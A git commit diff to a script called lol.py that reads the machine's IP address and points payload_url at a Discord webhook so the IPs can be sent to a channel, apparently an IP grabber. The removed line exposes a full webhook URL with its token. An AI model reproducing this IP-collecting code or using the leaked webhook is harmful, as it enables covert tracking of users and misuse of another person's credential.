19e5991595429fb436a8346daf1b40194973ae2d
FRISADO1 <93432977+FRISADO1@users.noreply.github.com>
2022-03-27 22:24:26 +0300

    Update lol.py

--- lol.py
+++ lol.py
@@ -3,7 +3,7 @@ import socket
 hostname=socket.gethostname()   
 IPAddr=socket.gethostbyname(hostname)   
 
-payload_url= "https://discord.com/api/webhooks/847124377660686356/L2cjlsYUswg7GCsHC9ZSExADnEoGns38t11rlyMP99JzTsJS_thf5NAN67dYM_OdliXU"
+payload_url= "YOUR DISCORD WEBHOOK TO SEND IP'S TO CHANNEL"
 while True:
     message = input()
     input=(IPAddr)
